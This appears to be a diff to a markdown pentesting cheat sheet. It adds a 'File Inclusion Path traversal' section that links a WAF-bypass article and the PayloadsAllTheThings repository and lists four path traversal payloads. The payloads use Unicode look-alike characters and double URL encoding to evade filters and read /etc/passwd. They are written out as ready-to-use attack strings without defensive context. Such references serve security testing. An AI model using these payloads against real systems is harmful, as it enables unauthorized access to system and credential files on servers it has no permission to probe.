@@ -6,6 +6,7 @@
 - [Request](#request)
 - [SQL Injection](#sql-injection)
 - [XML external entity (XXE)](#xml-external-entity-xxe)
+- [File Inclusion Path traversal](#file-inclusion-path-traversal)
 
 ## BruteForce
 ### ffuf
@@ -122,4 +123,17 @@ r = s.post('http://example.com/submit',
     # auth=('username', 'password')
 )
 print(r.status_code, r.url)
+```
+
+
+## File Inclusion Path traversal
+
+[Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
+[File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
+```
+︰/︰/︰/︰/︰/︰/︰/︰/︰/etc/passwd
+..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+%252e%252e%252e%252e%252e%252fetc%252fpasswd%00
 ```
